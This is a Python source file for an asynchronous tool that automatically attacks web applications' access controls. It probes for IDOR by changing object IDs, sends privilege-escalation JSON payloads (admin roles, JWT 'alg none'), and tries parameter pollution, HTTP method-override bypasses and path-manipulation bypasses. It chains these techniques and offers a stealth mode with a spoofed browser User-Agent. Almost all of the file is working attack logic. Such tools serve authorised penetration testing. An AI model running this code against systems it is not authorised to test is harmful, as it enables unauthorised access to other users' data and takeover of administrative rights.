"""
Broken Access Control Auto-Tester with Payload Chaining
Automated testing for IDOR, privilege escalation, and access control bypasses
"""
import asyncio
import aiohttp
import json
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, quote
import itertools

class AccessControlTester:
    """Automated Broken Access Control testing with payload chaining"""
    
    def __init__(self, target: str, auth_token: Optional[str] = None, stealth_mode: bool = False):
        self.target = target
        self.auth_token = auth_token
        self.stealth_mode = stealth_mode
        self.findings: List[Dict] = []
        self.endpoints_tested: List[str] = []
        
        self.idor_patterns = [
            r'/users?/(\d+)',
            r'/accounts?/(\d+)',
            r'/orders?/(\d+)',
            r'/invoices?/(\d+)',
            r'/documents?/(\d+)',
            r'/files?/(\d+)',
            r'/messages?/(\d+)',
            r'/profiles?/(\d+)',
            r'/api/v\d+/[^/]+/(\d+)',
            r'\?id=(\d+)',
            r'\?user_id=(\d+)',
            r'\?account=(\d+)',
            r'\?doc_id=(\d+)',
            r'uuid=([a-f0-9-]{36})',
        ]
        
        self.privilege_escalation_payloads = {
            "role_manipulation": [
                {"role": "admin"},
                {"role": "administrator"},
                {"is_admin": True},
                {"isAdmin": True},
                {"admin": True},
                {"user_type": "admin"},
                {"userType": "admin"},
                {"permissions": ["admin", "write", "delete"]},
                {"access_level": 0},
                {"accessLevel": 0},
                {"privilege": "root"}
            ],
            "jwt_tampering": [
                {"alg": "none"},
                {"alg": "HS256", "typ": "JWT"},
            ],
            "parameter_pollution": [
                "role=user&role=admin",
                "user_id=1&user_id=2",
                "admin=false&admin=true"
            ]
        }
        
        self.http_method_bypasses = [
            "GET", "POST", "PUT", "DELETE", "PATCH",
            "HEAD", "OPTIONS", "TRACE", "CONNECT",
            "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE"
        ]
        
        self.path_bypasses = [
            "",
            "/",
            "//",
            "/./",
            "/..",
            "/../",
            ";",
            ";/",
            ".json",
            ".xml",
            ".html",
            "?",
            "#",
            "%2e",
            "%2f",
            "%00",
            "%0d%0a"
        ]
    
    async def scan_idor(self, endpoints: List[str] = None) -> List[Dict]:
        """Scan for IDOR vulnerabilities"""
        if endpoints is None:
            endpoints = [self.target]
        
        async with aiohttp.ClientSession() as session:
            for endpoint in endpoints:
                for pattern in self.idor_patterns:
                    match = re.search(pattern, endpoint)
                    if match:
                        original_id = match.group(1)
                        await self._test_idor(session, endpoint, original_id, pattern)
        
        return self.findings
    
    async def _test_idor(self, session: aiohttp.ClientSession, endpoint: str, original_id: str, pattern: str):
        """Test IDOR with different IDs"""
        test_ids = self._generate_test_ids(original_id)
        
        headers = self._get_headers()
        
        try:
            async with session.get(endpoint, headers=headers, timeout=10) as original_response:
                original_status = original_response.status
                original_content = await original_response.text()
                original_length = len(original_content)
        except:
            return
        
        for test_id in test_ids:
            test_endpoint = re.sub(pattern, pattern.replace(r'(\d+)', test_id).replace(r'([a-f0-9-]{36})', test_id), endpoint)
            
            if test_endpoint == endpoint:
                continue
            
            try:
                async with session.get(test_endpoint, headers=headers, timeout=10) as response:
                    status = response.status
                    content = await response.text()
                    content_length = len(content)
                    
                    if status == 200 and content_length > 0:
                        if content_length != original_length or content != original_content:
                            self.findings.append({
                                "type": "IDOR",
                                "original_endpoint": endpoint,
                                "test_endpoint": test_endpoint,
                                "original_id": original_id,
                                "test_id": test_id,
                                "severity": "High",
                                "evidence": content[:200]
                            })
                
                if self.stealth_mode:
                    await asyncio.sleep(0.5)
                    
            except Exception:
                pass
    
    def _generate_test_ids(self, original_id: str) -> List[str]:
        """Generate test IDs for IDOR testing"""
        test_ids = []
        
        try:
            num = int(original_id)
            test_ids.extend([
                str(num - 1),
                str(num + 1),
                str(num - 10),
                str(num + 10),
                "0",
                "1",
                "999999",
                "-1",
                str(num * 2)
            ])
        except ValueError:
            if '-' in original_id:
                parts = original_id.split('-')
                modified = parts.copy()
                modified[-1] = 'aaaa' + modified[-1][4:]
                test_ids.append('-'.join(modified))
        
        return list(set(test_ids))
    
    async def test_privilege_escalation(self, user_endpoint: str) -> List[Dict]:
        """Test for privilege escalation vulnerabilities"""
        findings = []
        
        async with aiohttp.ClientSession() as session:
            headers = self._get_headers()
            
            for category, payloads in self.privilege_escalation_payloads.items():
                for payload in payloads:
                    if category == "parameter_pollution":
                        test_url = f"{user_endpoint}?{payload}"
                        try:
                            async with session.get(test_url, headers=headers, timeout=10) as response:
                                if response.status == 200:
                                    content = await response.text()
                                    if self._detect_privilege_escalation(content):
                                        findings.append({
                                            "type": "Privilege Escalation",
                                            "category": category,
                                            "payload": payload,
                                            "endpoint": test_url,
                                            "severity": "Critical"
                                        })
                        except:
                            pass
                    else:
                        headers_with_payload = {**headers, "Content-Type": "application/json"}
                        try:
                            async with session.post(
                                user_endpoint, 
                                headers=headers_with_payload,
                                json=payload,
                                timeout=10
                            ) as response:
                                if response.status in [200, 201]:
                                    content = await response.text()
                                    if self._detect_privilege_escalation(content):
                                        findings.append({
                                            "type": "Privilege Escalation",
                                            "category": category,
                                            "payload": payload,
                                            "endpoint": user_endpoint,
                                            "severity": "Critical"
                                        })
                        except:
                            pass
                
                if self.stealth_mode:
                    await asyncio.sleep(0.5)
        
        self.findings.extend(findings)
        return findings
    
    def _detect_privilege_escalation(self, content: str) -> bool:
        """Detect if privilege escalation was successful"""
        success_indicators = [
            '"role":"admin"',
            '"isAdmin":true',
            '"is_admin":true',
            '"admin":true',
            '"access_level":0',
            '"privilege":"root"',
            'administrator',
            'successfully upgraded',
            'permission granted'
        ]
        
        content_lower = content.lower()
        return any(indicator.lower() in content_lower for indicator in success_indicators)
    
    async def test_http_method_bypass(self, protected_endpoint: str) -> List[Dict]:
        """Test access control bypass via HTTP method manipulation"""
        findings = []
        
        async with aiohttp.ClientSession() as session:
            for method in self.http_method_bypasses:
                headers = self._get_headers()
                
                try:
                    async with session.request(
                        method,
                        protected_endpoint,
                        headers=headers,
                        timeout=10
                    ) as response:
                        if response.status in [200, 201, 204]:
                            findings.append({
                                "type": "HTTP Method Bypass",
                                "method": method,
                                "endpoint": protected_endpoint,
                                "status": response.status,
                                "severity": "High"
                            })
                except:
                    pass
                
                headers["X-HTTP-Method-Override"] = method
                try:
                    async with session.get(
                        protected_endpoint,
                        headers=headers,
                        timeout=10
                    ) as response:
                        if response.status in [200, 201, 204]:
                            findings.append({
                                "type": "HTTP Method Override Bypass",
                                "method": method,
                                "endpoint": protected_endpoint,
                                "severity": "High"
                            })
                except:
                    pass
                
                if self.stealth_mode:
                    await asyncio.sleep(0.3)
        
        self.findings.extend(findings)
        return findings
    
    async def test_path_traversal_bypass(self, protected_path: str) -> List[Dict]:
        """Test access control bypass via path manipulation"""
        findings = []
        base_url = urlparse(self.target)
        
        async with aiohttp.ClientSession() as session:
            headers = self._get_headers()
            
            for bypass in self.path_bypasses:
                test_paths = [
                    f"{protected_path}{bypass}",
                    f"{bypass}{protected_path}",
                    f"{protected_path}/{bypass}",
                    f"/{bypass}/{protected_path}",
                    protected_path.replace("/", f"/{bypass}/"),
                ]
                
                for test_path in test_paths:
                    test_url = f"{base_url.scheme}://{base_url.netloc}{test_path}"
                    
                    try:
                        async with session.get(test_url, headers=headers, timeout=10) as response:
                            if response.status == 200:
                                content = await response.text()
                                if len(content) > 100:
                                    findings.append({
                                        "type": "Path Traversal Bypass",
                                        "original_path": protected_path,
                                        "bypass_path": test_path,
                                        "url": test_url,
                                        "severity": "High"
                                    })
                    except:
                        pass
                
                if self.stealth_mode:
                    await asyncio.sleep(0.2)
        
        self.findings.extend(findings)
        return findings
    
    async def chain_payloads(self, endpoint: str) -> List[Dict]:
        """Chain multiple bypass techniques for comprehensive testing"""
        chain_results = []
        
        chains = [
            ("IDOR + Method", self._chain_idor_method),
            ("IDOR + Path", self._chain_idor_path),
            ("Privilege + IDOR", self._chain_privilege_idor),
            ("Full Chain", self._full_chain_test)
        ]
        
        for chain_name, chain_func in chains:
            try:
                result = await chain_func(endpoint)
                if result:
                    chain_results.append({
                        "chain_type": chain_name,
                        "result": result,
                        "severity": "Critical"
                    })
            except Exception as e:
                pass
        
        return chain_results
    
    async def _chain_idor_method(self, endpoint: str) -> Optional[Dict]:
        """Chain IDOR with HTTP method bypass"""
        idor_findings = await self.scan_idor([endpoint])
        
        for finding in idor_findings:
            method_findings = await self.test_http_method_bypass(finding.get("test_endpoint", ""))
            if method_findings:
                return {
                    "idor": finding,
                    "method_bypass": method_findings,
                    "chain_success": True
                }
        
        return None
    
    async def _chain_idor_path(self, endpoint: str) -> Optional[Dict]:
        """Chain IDOR with path traversal"""
        path = urlparse(endpoint).path
        path_findings = await self.test_path_traversal_bypass(path)
        
        for finding in path_findings:
            idor_findings = await self.scan_idor([finding.get("url", "")])
            if idor_findings:
                return {
                    "path_bypass": finding,
                    "idor": idor_findings,
                    "chain_success": True
                }
        
        return None
    
    async def _chain_privilege_idor(self, endpoint: str) -> Optional[Dict]:
        """Chain privilege escalation with IDOR"""
        priv_findings = await self.test_privilege_escalation(endpoint)
        
        for finding in priv_findings:
            idor_findings = await self.scan_idor([endpoint])
            if idor_findings:
                return {
                    "privilege_escalation": finding,
                    "idor": idor_findings,
                    "chain_success": True
                }
        
        return None
    
    async def _full_chain_test(self, endpoint: str) -> Optional[Dict]:
        """Full chain test combining all techniques"""
        results = {
            "idor": await self.scan_idor([endpoint]),
            "privilege": await self.test_privilege_escalation(endpoint),
            "method_bypass": await self.test_http_method_bypass(endpoint),
            "path_bypass": await self.test_path_traversal_bypass(urlparse(endpoint).path)
        }
        
        if any(results.values()):
            return {
                "full_chain_results": results,
                "vulnerabilities_found": sum(1 for v in results.values() if v),
                "chain_success": True
            }
        
        return None
    
    def _get_headers(self) -> Dict[str, str]:
        """Get request headers with optional auth"""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        return headers
    
    def get_report(self) -> Dict:
        """Generate access control testing report"""
        return {
            "target": self.target,
            "total_findings": len(self.findings),
            "critical": len([f for f in self.findings if f.get("severity") == "Critical"]),
            "high": len([f for f in self.findings if f.get("severity") == "High"]),
            "findings": self.findings,
            "endpoints_tested": len(self.endpoints_tested)
        }
